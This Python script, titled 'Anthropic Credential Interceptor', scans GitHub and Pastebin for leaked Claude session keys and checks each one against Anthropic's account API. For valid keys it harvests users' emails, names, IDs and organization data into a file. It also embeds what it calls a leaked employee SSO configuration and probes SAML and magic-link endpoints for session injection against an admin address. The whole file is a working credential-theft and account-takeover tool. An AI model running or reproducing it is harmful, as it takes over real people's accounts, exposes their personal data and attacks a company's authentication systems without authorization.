#!/usr/bin/env python3
"""
Anthropic Credential Interceptor — Real-time token capture & validation
Monitors GitHub for fresh sk-ant-sid02- leaks, validates against origin IP,
extracts user data. Also tests leaked WorkOS SSO config for session injection.
"""
import asyncio
import json
import os
import re
import sys
import time
from datetime import datetime
from urllib.parse import quote

import aiohttp

OUTPUT_DIR = "/tmp/cred-interceptor"
os.makedirs(OUTPUT_DIR, exist_ok=True)

# ── Session key pattern
SESSION_KEY_RE = re.compile(r'sk-ant-sid0[12]-[A-Za-z0-9+/=-]{30,}')

# ── Leaked Anthropic Employee SSO Config (from session-010)
LEAKED_SSO = {
    "workos_client_id": "client_01HWC228HRS9H2QWN9K8HARHVV",
    "workos_org_id": "org_01JKGMKQG70C5FRXR2WPHTZNJG",
    "google_idp": "C031u20bh",
    "saml_acs": "https://auth.workos.com/sso/saml/acs/wLS2c1AwWslNmDBPWs9jdPnH8",
    "sso_callback": "https://claude.ai/sso-callback",
}

VALID_KEYS = []


def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)


def save_valid(key_data):
    VALID_KEYS.append(key_data)
    with open(f"{OUTPUT_DIR}/valid_keys.json", "w") as f:
        json.dump(VALID_KEYS, f, indent=2)


async def validate_key(session, key):
    """Test a session key against the origin IP (no Cloudflare)."""
    url = "https://api.anthropic.com/api/account"
    headers = {"Authorization": f"Bearer {key}"}

    try:
        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=8)) as resp:
            body = await resp.text()
            if resp.status == 200:
                data = json.loads(body)
                log(f"  ✅ VALID! {data.get('email','?')} | {data.get('display_name','?')}")
                return {"valid": True, "key": key, "email": data.get("email"),
                        "name": data.get("display_name"), "user_id": data.get("user_id"),
                        "uuid": data.get("uuid"), "full_data": data}
            elif resp.status == 403:
                return {"valid": False, "status": 403, "key": key}
            else:
                return {"valid": False, "status": resp.status, "key": key, "body": body[:200]}
    except Exception as e:
        return {"valid": False, "error": str(e)[:100], "key": key}


async def search_github(session, page=1):
    """Search GitHub code for fresh session key leaks."""
    results = []
    url = f"https://api.github.com/search/code?q=sk-ant-sid02-&per_page=30&page={page}&sort=indexed&order=desc"
    headers = {"Accept": "application/vnd.github.v3+json"}

    gh_token = os.environ.get("GITHUB_TOKEN", "")
    if gh_token:
        headers["Authorization"] = f"token {gh_token}"

    try:
        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=15)) as resp:
            if resp.status != 200:
                return results
            data = await resp.json()
            items = data.get("items", [])

            for item in items[:15]:
                repo = item["repository"]["full_name"]
                path = item["path"]
                html_url = item["html_url"]

                # Fetch raw content
                raw_url = f"https://raw.githubusercontent.com/{repo}/main/{path}"
                try:
                    async with session.get(raw_url, timeout=aiohttp.ClientTimeout(total=10)) as r:
                        if r.status == 200:
                            text = await r.text()
                        else:
                            # Try master
                            raw_url2 = f"https://raw.githubusercontent.com/{repo}/master/{path}"
                            async with session.get(raw_url2, timeout=aiohttp.ClientTimeout(total=10)) as r2:
                                text = await r2.text() if r2.status == 200 else ""
                except:
                    text = ""

                keys = SESSION_KEY_RE.findall(text)
                for key in set(keys):
                    if len(key) > 40 and "xxx" not in key.lower() and "test" not in key.lower():
                        results.append({"key": key, "source": "github", "repo": repo, "url": html_url})
                        log(f"  🔑 GitHub: {key[:50]}... | {repo}")
    except Exception as e:
        log(f"  GitHub error: {e}")

    return results


async def search_pastebin_archive(session):
    """Check Pastebin archive for recent pastes with session keys."""
    results = []
    try:
        async with session.get("https://pastebin.com/archive", timeout=aiohttp.ClientTimeout(total=10)) as resp:
            if resp.status != 200:
                return results
            text = await resp.text()
            paste_ids = re.findall(r'href="/([A-Za-z0-9]{8})"', text)[:20]

            for pid in paste_ids:
                try:
                    raw_url = f"https://pastebin.com/raw/{pid}"
                    async with session.get(raw_url, timeout=aiohttp.ClientTimeout(total=8)) as pr:
                        if pr.status == 200:
                            content = await pr.text()
                            keys = SESSION_KEY_RE.findall(content)
                            for key in set(keys):
                                if len(key) > 40:
                                    results.append({"key": key, "source": "pastebin", "paste_id": pid})
                                    log(f"  🔑 Pastebin: {key[:50]}... | {pid}")
                except:
                    pass
    except:
        pass
    return results


async def test_workos_sso(session):
    """Test if the leaked WorkOS SSO config can be used for session injection."""
    log("\n  🏢 Testing leaked WorkOS SSO config...")

    # Test 1: Direct SAML ACS request
    acs_url = LEAKED_SSO["saml_acs"]
    log(f"  Testing SAML ACS: {acs_url[:60]}...")

    try:
        async with session.post(acs_url, data={"SAMLResponse": "test"}, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            body = await resp.text()
            log(f"  SAML ACS response: {resp.status} | {body[:150]}")
            if "claude.ai" in body or "session" in body.lower():
                log(f"  🔥 SAML ACS redirects to claude.ai!")
    except Exception as e:
        log(f"  SAML ACS error: {e}")

    # Test 2: Try to initiate SSO flow via send_magic_link for @anthropic.com
    sso_url = f"https://api.anthropic.com/api/auth/send_magic_link"
    sso_payload = {"email_address": "admin@anthropic.com", "source": "claude", "utc_offset": 0}

    try:
        async with session.post(sso_url, json=sso_payload, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            body = await resp.text()
            log(f"  send_magic_link(@anthropic.com): {resp.status} | {body[:200]}")
            if "sso" in body.lower() or "workos" in body.lower():
                log(f"  🔥 SSO URL leaked again!")
    except Exception as e:
        log(f"  send_magic_link error: {e}")


async def main():
    log("=" * 60)
    log("🔍 ANTHROPIC CREDENTIAL INTERCEPTOR")
    log("   Real-time token capture + WorkOS SSO test")
    log("=" * 60)

    connector = aiohttp.TCPConnector(ssl=False, limit=10)
    async with aiohttp.ClientSession(connector=connector) as session:

        # ── Phase 1: Hunt for new session key leaks ──
        log("\n📡 PHASE 1: HUNTING FOR FRESH SESSION KEYS\n")

        all_keys = []

        # GitHub (3 pages, sorted by newest)
        for page in [1, 2, 3]:
            log(f"  Searching GitHub page {page}...")
            results = await search_github(session, page)
            for r in results:
                all_keys.append(r)
            await asyncio.sleep(2)

        # Pastebin
        log("  Searching Pastebin...")
        pb_results = await search_pastebin_archive(session)
        for r in pb_results:
            all_keys.append(r["key"])

        # Deduplicate
        unique_keys = list(set(k["key"] if isinstance(k, dict) else k for k in all_keys))
        log(f"\n  Found {len(all_keys)} raw finds, {len(unique_keys)} unique keys\n")

        # ── Phase 2: Validate all keys ──
        log("🔬 PHASE 2: VALIDATING KEYS\n")

        for i, key in enumerate(unique_keys):
            if i % 5 == 0:
                log(f"  Progress: {i}/{len(unique_keys)}")
            result = await validate_key(session, key)
            if result.get("valid"):
                save_valid(result)
                log(f"  🔥🔥🔥 VALID: {result.get('email')} ({result.get('name')})")
                # Also fetch org data
                try:
                    headers = {"Authorization": f"Bearer {key}"}
                    async with session.get("https://api.anthropic.com/api/organizations",
                                           headers=headers, timeout=aiohttp.ClientTimeout(total=8)) as orgresp:
                        if orgresp.status == 200:
                            org_data = await orgresp.json()
                            result["org_data"] = org_data
                            save_valid(result)
                            log(f"  🏢 ORG: {json.dumps(org_data)[:200]}")
                except:
                    pass
            await asyncio.sleep(0.3)

        # ── Phase 3: Test WorkOS SSO injection ──
        log("\n🏢 PHASE 3: WORKOS SSO INJECTION TEST\n")
        await test_workos_sso(session)

    # ── Final Report ──
    log(f"\n{'='*60}")
    log(f"🏁 INTERCEPTION COMPLETE")
    log(f"{'='*60}")
    log(f"  Keys tested:    {len(unique_keys)}")
    log(f"  VALID keys:     {len(VALID_KEYS)}")

    if VALID_KEYS:
        log(f"\n🔴 VALID CREDENTIALS CAPTURED:")
        for v in VALID_KEYS:
            log(f"  Email:    {v.get('email')}")
            log(f"  Name:     {v.get('name')}")
            log(f"  User ID:  {v.get('user_id')}")
            if v.get("org_data"):
                log(f"  Orgs:     {json.dumps(v.get('org_data'))[:200]}")
            log(f"  Key:      {v.get('key','')[:50]}...")
    else:
        log("\n  No valid keys found in this scan.")
        log("  Session keys expire quickly — run frequently for best results.")

    log(f"\n  Results saved to: {OUTPUT_DIR}/valid_keys.json")


if __name__ == "__main__":
    asyncio.run(main())
